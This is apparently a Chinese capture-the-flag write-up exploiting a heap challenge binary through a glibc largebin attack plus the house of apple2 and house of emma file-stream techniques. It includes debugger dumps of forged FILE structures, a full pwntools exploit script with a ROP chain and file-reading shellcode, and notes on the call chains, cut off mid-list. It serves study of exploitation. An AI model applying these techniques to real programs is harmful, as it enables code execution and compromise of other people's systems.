函数）\n\n\n_IO_FILE_plus结构体偏移\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\namd64：\n \n0x0:'_flags',\n0x8:'_IO_read_ptr',\n0x10:'_IO_read_end',\n0x18:'_IO_read_base',\n0x20:'_IO_write_base',\n0x28:'_IO_write_ptr',\n0x30:'_IO_write_end',\n0x38:'_IO_buf_base',\n0x40:'_IO_buf_end',\n0x48:'_IO_save_base',\n0x50:'_IO_backup_base',\n0x58:'_IO_save_end',\n0x60:'_markers',\n0x68:'_chain',\n0x70:'_fileno',\n0x74:'_flags2',\n0x78:'_old_offset',\n0x80:'_cur_column',\n0x82:'_vtable_offset',\n0x83:'_shortbuf',\n0x88:'_lock',\n0x90:'_offset',\n0x98:'_codecvt',\n0xa0:'_wide_data',\n0xa8:'_freeres_list',\n0xb0:'_freeres_buf',\n0xb8:'__pad5',\n0xc0:'_mode',\n0xc4:'_unused2',\n0xd8:'vtable'\n\n\n首先上_IO_list_all的函数\n\n\n\n0x7ca9cdff3660 是全局变量 __GI__IO_list_all 的地址（也就是存指针的地方）\n\n0x7ca9cdff3680 是实际的 FILE 对象（_IO_2_1_stderr_）所在地址\n\n原结构体：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\npwndbg&gt; p *(struct _IO_FILE_plus*) 0x7ca9cdff3680\n$3 = {\n  file = {\n    _flags = -72540025,\n    _IO_read_ptr = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_read_end = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_read_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_write_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_write_ptr = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_write_end = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_buf_base = 0x7ca9cdff3703 &lt;_IO_2_1_stderr_+131&gt; \"\",\n    _IO_buf_end = 0x7ca9cdff3704 &lt;_IO_2_1_stderr_+132&gt; \"\",\n    _IO_save_base = 0x0,\n    _IO_backup_base = 0x0,\n    _IO_save_end = 0x0,\n    _markers = 0x0,\n    _chain = 0x7ca9cdff3760 &lt;_IO_2_1_stdout_&gt;,\n    _fileno = 2,\n    _flags2 = 0,\n    _old_offset = -1,\n    _cur_column = 0,\n    _vtable_offset = 0 '\\000',\n    _shortbuf = \"\",\n    _lock = 0x7ca9cdff5720 &lt;_IO_stdfile_2_lock&gt;,\n    _offset = -1,\n    _codecvt = 0x0,\n    _wide_data = 0x7ca9cdff2880 &lt;_IO_wide_data_2&gt;,\n    _freeres_list = 0x0,\n    _freeres_buf = 0x0,\n    __pad5 = 0,\n    _mode = 0,\n    _unused2 = '\\000' &lt;repeats 19 times&gt;\n  },\n  vtable = 0x7ca9cdff4560 &lt;__GI__IO_file_jumps&gt;\n}\n\n\n\n修改后：\n\n\n\nfake_IO_FILE_plus（house of apple2）:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\npwndbg&gt; p *(struct _IO_FILE_plus*) 0x599c8d7a9810\n$20 = {\n  file = {\n    _flags = -1921343488,\n    _IO_read_ptr = 0xa81 &lt;error: Cannot access memory at address 0xa81&gt;,\n    _IO_read_end = 0x7ca9cdff3250 &lt;main_arena+1520&gt; \"@2\\377ͩ|\",\n    _IO_read_base = 0x599c8d7a97e0 \"\",\n    _IO_write_base = 0x599c8d7a97e0 \"\",\n    _IO_write_ptr = 0x7ca9cdff3640 &lt;_nl_global_locale+224&gt; \"\\255a\\373ͩ|\",\n    _IO_write_end = 0x0,\n    _IO_buf_base = 0x0,\n    _IO_buf_end = 0x0,\n    _IO_save_base = 0x599c8d7a9a00 \" \",\n    _IO_backup_base = 0x0,\n    _IO_save_end = 0x0,\n    _markers = 0x0,\n    _chain = 0x0,\n    _fileno = 0,\n    _flags2 = 0,\n    _old_offset = -1,\n    _cur_column = 0,\n    _vtable_offset = 0 '\\000',\n    _shortbuf = \"\",\n    _lock = 0x7ca9cdff5720 &lt;_IO_stdfile_2_lock&gt;,\n    _offset = -1,\n    _codecvt = 0x0,\n    _wide_data = 0x599c8d7a98f0,\n    _freeres_list = 0x0,\n    _freeres_buf = 0x0,\n    __pad5 = 0,\n    _mode = 0,\n    _unused2 = '\\000' &lt;repeats 19 times&gt;\n  },\n  vtable = 0x7ca9cdff4020 &lt;__GI__IO_wfile_jumps&gt;\n}\n\n\nhouse of emma\n\n这里主要利用了在fflush(stderr)，这个函数会稳定的调用_IO_file_jumps中的sync，如果我们把这个指针伪造成之前提到的pcop的gadget也就是\n\nmov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];\n\n\n我们就可以实现rdx，而且call对应的函数，这里一般为setcontext+61,但是这篇文章是将其call mprotect函数，这样就可以增加可执行权限，之后直接执行orw的shellcode就可以了，原理一样的\n\n程序主逻辑，具备增删改查功能，最小申请堆的大小为key*0x110，限定创建堆块的大小都是large bin中的\n\n\n\nadd函数\n\n\n\n没有堆溢出，有申请三种方式，申请空间有key,key+0x10,2*key三种\n\ndelete函数\n\n\n\n存在UAF漏洞\n\nedit函数\n\n\n\n只有一次写入机会\n\nshow函数\n\n\n\n只有一次泄露的机会\n\n利用步骤\n\n1.利用一次write泄露出libc和heapbase\n\n2.构造一次largebin attack，修改_IO_list_all为一个堆地址\n\n3.利用house of apple修改pointer_guard的值为已知地址\n\n4.利用house of emma控制rsp\n\n5.执行orw读取flag\n\n堆风水的构造\n\n由于我们只能任意修改一次的chunk内容，所以如果我们想要进行large bin attack攻击形成任意地址写一个堆地址，又在这个堆地址内完成对于fake file的构造，就需要我们完成以下的chunk构造，借用roderick01师傅的图。只有只有我们才能在伪造bk_nextsize的同时修改size为并且伪造fakechunk实现house of apple和house of emma的攻击。\n\n\n\n关于这个堆风水的布局，我之前一直很疑惑，为什么add(small),add(meidum),add(large)有这么多差别？？？\n\n后面学习了很多博主和gpt分析后，我大致理解了原理\n\n我们的目的就是构造三个chunk的布局\n\n1\n2\n3\n4\n5\nchunk1 = heap_addr + 0x24\n\nchunk2 = heap_addr + 0x34\n\nchunk3 = heap_addr + 0x54\n\n\n如何构造的呢？\n\n首先我们可以分配的chunk的大小是key,key+0x10,2*key，然后依照大佬方式设置的key为0xa\n\n先设x = key+0x10,y = key +0x10+0x10,z = 2*key+0x10 ,我们可以得到一些关系，\n\n1\n2\n3\n4\n5\n2 * x = 2 * (0xa+0x10) = 0x34\n\n2 * y = 2 * (0xa+0x20) = 0x54\n\nz = 2 * 0xa +0x20 = 0x24\n\n\n这意味着什么呢？就是我们分配2个small大小的堆，下个堆块指针指向的是chunk2的位置，分配2个meidum大小的堆块，下个堆块指向的是chunk3的位置，分配1个large大小的堆块，下个堆块指向的是chunk1的指针,然后由于后面删除的是unsortbin，导致和没分配一样的，就可以进行堆风水构造\n\n那么合理利用堆风水就可以构造出三个重叠的堆块:\n\n（从上至下顺序为：large+small,2small+small,2medium+small）\n\n继而可以修改堆块A的bk_nextsize指针并伪造一个堆块B，这样再进行largebin attack的时候就既可以任意地址写一个堆地址，也可以控制写的堆地址所在chunk的内容，从而构造fake file结构体。\n\n代码分析\n\n第一次堆风水，布置上面的大佬图中的chunk3（也就是代码里的2），两个meidum+small\n\n1\n2\n3\n4\n5\n6\nadd(2) #0\nadd(2) #1\nadd(1) #2\ndele(2)\ndele(1)\ndele(0)\n\n\n第二次堆风水，布置大佬图中的chunk2（也就是代码里的5）,两个small+small\n\n1\n2\n3\n4\n5\n6\nadd(1) #3\nadd(1) #4\nadd(1) #5\nadd(1) #6\ndele(3)\ndele(5)\n\n\n释放堆块3和堆块5进入unsortbin，可以泄露的了libc基址和heap基址\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\nadd(1) #3\nadd(1) #4\nadd(1) #5\nadd(1) #6\ndele(3)\ndele(5)\nshow(3)\n\nru(b'Message: \\n')\nlibc_base = uu64() - 0x1f2cc0\nlg(b'libc_base',libc_base)\nio.recv(2)\nheap_base = uu64() - 0x17f0\nlg(b'heap_base',heap_base)\n\n\n\n\n关于TLS段的本地pointer_guard\n\n关于TLS段的本地pointer_guard怎么找，有个很恶心的点，就是在以前系统内核版本不高的时候，你可以用libc_base去直接得到pointer_guard的地址的，但是现在反正我无法像roderick01师傅一样，用他们打的时候的tls段就在libc基址前面一点，现在不行，已经调试过n遍，一直都会变的，和libc基址没关系了，pointer_guard的地址，与ld基地址偏移是固定的，而与libc基地址的偏移不固定。\n所以在本地调试过程中，需要关闭aslr，才能获得与libc基地址的固定偏移，当打远程的题目时，则需要爆破。\n\n方法1：fsbase+0x30（tls+0x30）\n\n\n\n方法2:\n\n\n\n第三次堆风水，布置大佬图中的chunk1（也就是代码里的8）\n\n1\n2\n3\n4\n5\n6\n7\ndele(4)\ndele(6)\nadd(3) #7\nadd(1) #8\nadd(1) #8\ndele(8)\nadd(3)\n\n\n解释一下，dele(8)是为了先free掉我们的提到的chunk2，，当 malloc 在找合适块时，它会遍历 unsorted 的条目，会优先检查 unsorted bin。如果某个 unsorted 条目正好或可以分割出一个满足请求的小块，malloc 会用它（并把剩下的部分重新插回合适的 bin）。如果某个条目太大/不能直接用来划分，malloc 会把它按大小插入到 largebin（或者 smallbin，视大小而定），以便下次快速匹配，然后add(3)这么大的堆块需要0x1550的大小，而前面的unsorted bin只有0xab0大小，所以malloc会把原来的unsorted bin插入large bin里去，然后从top chunk里分配给新的堆块\n\n\n\n1\n2\n3\n4\nedit(5,data)\ndele(2)\nadd(3)\nexit()\n\n\n触发largebin attack之后修改成功了，可以修改chunk8的bk_nextsize为_IO_list_all，，并且chunk2是0x810,于是我们同时将chunk2的size修改，从而伪造一个chunk进行释放，那么想一下，这里触发的largebin attack正好将_IO_list_all修改为这个伪造的chunk，那么我们继续往下写的话，那相当于就是对伪造的_IO_list_all进行填充，那我们就实现了任意控制__IO_list_all了。\n\n\n\n伪造后的file表结构\n\n（这个是修改pointer_guard）\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\npwndbg&gt; p *(struct _IO_FILE_plus*) 0x555555606810\n$2 = {\n  file = {\n    _flags = 0,\n    _IO_read_ptr = 0xa81 &lt;error: Cannot access memory at address 0xa81&gt;,\n    _IO_read_end = 0x7ffff7df2cc0 &lt;main_arena+96&gt; \"\\220\\222`UUU\",\n    _IO_read_base = 0x7ffff7df2cc0 &lt;main_arena+96&gt; \"\\220\\222`UUU\",\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x0,\n    _IO_write_end = 0x0,\n    _IO_buf_base = 0x0,\n    _IO_buf_end = 0x0,\n    _IO_save_base = 0x0,\n    _IO_backup_base = 0x0,\n    _IO_save_end = 0x0,\n    _markers = 0x0,\n    _chain = 0x555555606910,\n    _fileno = 0,\n    _flags2 = 8,\n    _old_offset = -1,\n    _cur_column = 0,\n    _vtable_offset = 0 '\\000',\n    _shortbuf = \"\",\n    _lock = 0x7ffff7df5720 &lt;_IO_stdfile_2_lock&gt;,\n    _offset = -1,\n    _codecvt = 0x0,\n    _wide_data = 0x7ffff7fc4630, //这个是pointer_guard所在的堆地址\n    _freeres_list = 0x0,\n    _freeres_buf = 0x0,\n    __pad5 = 0,\n    _mode = 0,\n    _unused2 = '\\000' &lt;repeats 19 times&gt;\n  },\n  vtable = 0x7ffff7df3d20 &lt;_IO_wstrn_jumps&gt;\n}\n\n\n\n我们把chain改成了0x910，vtable改成了_IO_wstrn_jumps(跳转到_IO_wstrn_overflow),接着看一下0x910这个fake file结构体\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\npwndbg&gt; p *(struct _IO_cookie_file*) 0x555555606910\n$4 = {\n  __fp = {\n    file = {\n      _flags = 0,\n      _IO_read_ptr = 0x0,\n      _IO_read_end = 0x0,\n      _IO_read_base = 0x0,\n      _IO_write_base = 0x0,\n      _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,\n      _IO_write_end = 0x0,\n      _IO_buf_base = 0x0,\n      _IO_buf_end = 0x0,\n      _IO_save_base = 0x0,\n      _IO_backup_base = 0x0,\n      _IO_save_end = 0x0,\n      _markers = 0x0,\n      _chain = 0x0,\n      _fileno = 0,\n      _flags2 = 8,\n      _old_offset = -1,\n      _cur_column = 0,\n      _vtable_offset = 0 '\\000',\n      _shortbuf = \"\",\n      _lock = 0x7ffff7df5720 &lt;_IO_stdfile_2_lock&gt;,\n      _offset = -1,\n      _codecvt = 0x0,\n      _wide_data = 0x0,\n      _freeres_list = 0x0,\n      _freeres_buf = 0x0,\n      __pad5 = 0,\n      _mode = 0,\n      _unused2 = '\\000' &lt;repeats 19 times&gt;\n    },\n    vtable = 0x7ffff7df3b38 &lt;_IO_cookie_jumps+88&gt;\n  },\n  __cookie = 0x555555606a10,\n  __io_functions = {\n    read = 0x5555456812400000,\n    write = 0x6661616566616164,\n    seek = 0x6661616766616166,\n    close = 0x7ffff7cfd449 &lt;__lockf64+73&gt;\n  }\n}\n\n\n\n\n\n然后又将rbp的值给rdx，这里就将pointer_guard的值给修改了。而rbp就是f1._wide_data = guard\n\n传入的值，这里修改了point_guard的值\n\n然后继续执行下一个fake file结构体\n\n\n\n进行加密操作\n\n\n\n加密后正好执行我们的gadget\n\n\n\n\n\n后面就开始执行rop链了\n\n\n\n可以知道为什么target_addr的地址要加0x20，因为经过call qword ptr [rax + 0x18]后，可以直接调用_IO_cookie_read函数\n\n拿到flag\n\n\n\n关于第一个IO结构体的_chain地址为什么是chain = heap_base + 0x17e0 + 0x30 + 0x100，因为第一个large bin距离heapbase的偏移是0x17e0，然后由于分配2个medium大小的chunk后的下一个指向的chunk3，与chunk1的偏移是0x30(0x54-0x24),上文提到过，然后f1与f2的距离有0x100的偏移，所以说___chain的地址就是f2的地址\n\nexp:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\nfrom pwn import *\nfrom pwncli import* \nfrom ctypes import *\n\npwn = './oneday'\nlibc = ELF(\"./libc.so.6\")\nif args['REMOTE']:\n    io = remote('192.168.18.22', 8888)\nelse:\n    io = process(pwn)\n    #io = process(['setarch','$(uname -m)','-R','./oneday'])\n\ncontext(log_level='debug')\n#context.terminal = ['tmux','splitw','-h']\ncontext.binary = elf = ELF(pwn)\nrop = ROP(context.binary)\n\ns = lambda data: io.send(data)\nsa = lambda text, data: io.sendafter(text, data)\nsl = lambda data: io.sendline(data)\nsla = lambda text, data: io.sendlineafter(text, data)\nr = lambda num=4096: io.recv(num)\nru = lambda text: io.recvuntil(text)\npr = lambda num=4096: print(io.recv(num))\ninter = lambda: io.interactive()\n\nl32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))\nl64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))\nuu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)\nuu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))\nuu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)\nuuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))\n\nint16 = lambda data: int(data, 16)\n\nlg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))\n\ndef get_sb():\n    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))\n\ndef get_orw():\n    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']\n\ndef debug(breakpoints=None):\n    if breakpoints is None:\n        breakpoints = [\"__call_tls_dtors\"]\n    elif isinstance(breakpoints, str):\n        breakpoints = [breakpoints]\n    script = \"\"\n    for bp in breakpoints:\n        script += f\"{bp}\\n\"\n    gdb.attach(proc.pidof(io)[0], script)\n    pause()\n\ndef fmt(value, offset=14, size='hhn'):\n    if size == 'hhn':\n        num = value &amp; 0xff\n    elif size == 'hn':\n        num = value &amp; 0xffff\n    elif size == 'n':\n        num = value &amp; 0xffffffff\n    payload = f'%{num}c%{offset}${size}'.encode()\n    #value 是格式化字符串偏移          \n    return payload\n\nlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))\n\ndef cat_flag():\n    flag_header = b'flag{'\n    sleep(1)\n    sl('cat flag')\n    ru(flag_header)\n    flag = flag_header + ru('}') + b'}'\n    exit(0)\n\n#asm(shellcraft.sh()).ljust(0x108,b'a')\n\ndef set_key(key):\n    sla(b'key &gt;&gt;\\n',str(key))\n\ndef add(choise):\n   sla(b'command:',b'1')\n   sla(b'choise: ',str(choise))\n\ndef dele(idx):\n    sla(b'command: \\n',b'2')\n    sla(b'Index: ',str(idx))\n\ndef edit(idx,commend):\n    sla(b'command:',b'3')\n    sla(b'Index: ',str(idx))\n    sa(b'Message: \\n',commend)\ndef show(idx):\n    sla(b'command:',b'4')   \n    sla(b'Index: ',str(idx))\n   \ndef exit():\n    sla(b'command:',b'6')  \n\nset_key(10)\ndebug(\"call (void)signal(SIGALRM, SIG_IGN)\") \nadd(2) #0\nadd(2) #1\nadd(1) #2\ndele(2)\ndele(1)\ndele(0)\n\nadd(1) #3\nadd(1) #4\nadd(1) #5\nadd(1) #6\n\ndele(3)\ndele(5)\nshow(3)\n\nru(b'Message: \\n')\nlibc_base = uu64() - 0x1f2cc0\nlg(b'libc_base',libc_base)\nio.recv(2)\nheap_base = uu64() - 0x17f0\nlg(b'heap_base',heap_base)\n\n\ndele(4)\ndele(6)\nadd(3) #7\nadd(1) #8\nadd(1) #9\npause()\ndele(8)\nadd(3)\n\ntarget_addr = libc_base + libc.sym['_IO_list_all'] \nlg(b'_IO_list_all',target_addr)\n_IO_cookie_jumps = libc_base + 0x1f3ae0\n_IO_wstrn_jumps = libc_base + 0x1f3d20\n_IO_stdfile_1_lock = libc_base + 0x1f5720\n__pointer_chk_guard_local = libc_base + 0x3c4630\nmagic = libc_base + 0x146020\nchain = heap_base + 0x17e0 + 0x30 + 0x100\nexpected = heap_base + 0x17e0 + 0x20 +0x100 \n\nmov_rsp_rdx = libc_base + 0x56530\nadd_rsp_0x20_pop_rbx = libc_base + 0xfd449\npop_rdi = libc_base + 0x2daa2\npop_rsi = libc_base + 0x37c0a\npop_rdx_rbx = libc_base + 0x87729 \n\nf1 = IO_FILE_plus_struct()\nf1._IO_read_ptr = 0xa81\nf1.chain = chain\nf1._flags2 = 8\nf1._lock = _IO_stdfile_1_lock\nf1._mode = 0\nf1._wide_data = __pointer_chk_guard_local\nf1.vtable = _IO_wstrn_jumps\n\nf2 = IO_FILE_plus_struct()\nf2._IO_write_base = 0\nf2._IO_write_ptr = 1\nf2._mode = 0\nf2._lock = _IO_stdfile_1_lock\nf2._flags2 = 8\nf2.vtable = _IO_cookie_jumps +0x58\n\n\ndata = flat(\n    {\n    0x8: target_addr-0x20,\n    0x10: {\n         0:{\n           0:bytes(f1),\n           0x100:{\n               0:bytes(f2),\n               0xe0:[chain + 0x100,rol(magic ^ expected,0x11)],\n               0x100:[\n                   add_rsp_0x20_pop_rbx,\n                   chain + 0x100,\n                   0,\n                   0,\n                   mov_rsp_rdx,\n                   0,\n                   pop_rdi,\n                   chain &amp; ~0xfff,\n                   pop_rsi,\n                   0x4000,\n                   pop_rdx_rbx,\n                   7,0,\n                   libc_base + libc.sym[\"mprotect\"],\n                   chain + 0x200,#存放orw的rop链的堆地址\n               ],\n          \n           0x200:asm(shellcraft.open('./flag',0)\n            +shellcraft.read(3,heap_base,0x100)+shellcraft.write(1,heap_base,0x100)),     \n                 }\n            },\n            0xa80:[0,0xab1]\n    }\n}\n)\nf1_addr = heap_base + 0x1810\nf2_addr = heap_base + 0x1910\n\n# x = 0xa + 0x10 = 0x1a\n# y = 0xa + 0x10 + 0x10 = 0x2a\n# z = 2 * 0xa + 0x10 = 0x24  \n\n\n#chunk1_addr = f1_addr - 0X10 + 0x24\n#chunk2_addr = f1_addr - 0X10 + 0x34\n#chunk3_addr = f1_addr - 0x10 + 0x54 \n\nlg(b'f1_addr',f1_addr)\nlg(b'f2_addr',f2_addr)\n\nedit(5,data)\ndele(2)\npause()\nadd(3)\nexit()\ninter()\n\n\nhouse of apple2\n\n利用条件\n\n使用house of apple2的条件为：\n\n\n  已知heap地址和glibc地址\n  能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n  能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制\n\n\n利用原理\n\nstdin/stdout/stderr这三个_IO_FILE结构体使用的是_IO_file_jumps这个vtable，而当需要调用到vtable里面的函数指针时，会使用宏去调用。以_IO_file_overflow调用为例，glibc中调用的代码片段分析如下\n\n1\n2\n3\n4\n5\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n \n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n \n# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))\n\n\n其中，IO_validate_vtable函数负责检查vtable的合法性，会判断vtable的地址是不是在一个合法的区间。如果vtable的地址不合法，程序将会异常终止。\n\n观察struct _IO_wide_data结构体，发现其对应有一个_wide_vtable成员。\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\nstruct _IO_wide_data\n{\n  wchar_t *_IO_read_ptr;    /* Current read pointer */\n  wchar_t *_IO_read_end;    /* End of get area. */\n  wchar_t *_IO_read_base;    /* Start of putback+get area. */\n  wchar_t *_IO_write_base;    /* Start of put area. */\n  wchar_t *_IO_write_ptr;    /* Current put pointer. */\n  wchar_t *_IO_write_end;    /* End of put area. */\n  wchar_t *_IO_buf_base;    /* Start of reserve area. */\n  wchar_t *_IO_buf_end;        /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */\n  wchar_t *_IO_backup_base;    /* Pointer to first valid character of\n                   backup area */\n  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */\n  \n  __mbstate_t _IO_state;\n  __mbstate_t _IO_last_state;\n  struct _IO_codecvt _codecvt;\n  wchar_t _shortbuf[1];\n  const struct _IO_jump_t *_wide_vtable;\n};\n\n\n在调用_wide_vtable虚表里面的函数时，同样是使用宏去调用，仍然以vtable-&gt;_overflow调用为例，所用到的宏依次为：\n\n1\n2\n3\n4\n5\n6\n7\n8\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)\n \n#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n \n#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n \n#define _IO_WIDE_JUMPS(THIS) \\\n  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n\n可以看到，在调用_wide_vtable里面的成员函数指针时，没有关于vtable的合法性检查。\n\n因此，我们可以劫持IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可控的堆地址空间，进而控制_wide_data-&gt;_wide_vtable为可控的堆地址空间。控制程序执行IO流函数调用，最终调用到_IO_Wxxxxx函数即可控制程序的执行流。\n\n利用思路\n\n目前在glibc源码中搜索到的_IO_WXXXXX系列函数的调用只有_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE和_IO_WOVERFLOW。\n其中_IO_WSETBUF和_IO_WUNDERFLOW目前无法利用或利用困难，其余的均可构造合适的_IO_FILE进行利用。这里给出我总结的几条比较好利用的链。以下使用fp指代_IO_FILE结构体变量。\n\n利用_IO_wfile_overflow函数控制程序执行流\n\n对fp的设置如下：\n\n\n  _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格\n  vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可\n  _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n  _wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0\n  _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n  _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n  _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n\n函数的调用链如下：\n\n1\n2\n3\n4\n_IO_wfile_overflow\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)\n\n\n详细分析如下：\n首先看_IO_wfile_overflow函数\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\nwint_t\n_IO_wfile_overflow (FILE *f, wint_t wch)\n{\n  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */\n    {\n      f-&gt;_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return WEOF;\n    }\n  /* If currently reading or no buffer allocated. */\n  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)\n    {\n      /* Allocate a buffer if needed. */\n      if (f-&gt;_wide_data-&gt;_IO_write_base == 0)\n    {\n      _IO_wdoallocbuf (f);// 需要走到这里\n      // ......\n    }\n    }\n}\n\n\n需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0\n\n然后看_IO_wdoallocbuf函数：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\nvoid\n_IO_wdoallocbuf (FILE *fp)\n{\n  if (fp-&gt;_wide_data-&gt;_IO_buf_base)\n    return;\n  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))\n    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用\n      return;\n  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,\n             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);\n}\nlibc_hidden_def (_IO_wdoallocbuf)\n\n\n需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。\n\n利用_IO_wfile_underflow_mmap函数控制程序执行流\n\n对fp的设置如下：\n\n\n  _flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格\n  vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n  _IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n  _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n  _wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n  _wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n  _wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0\n  _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) 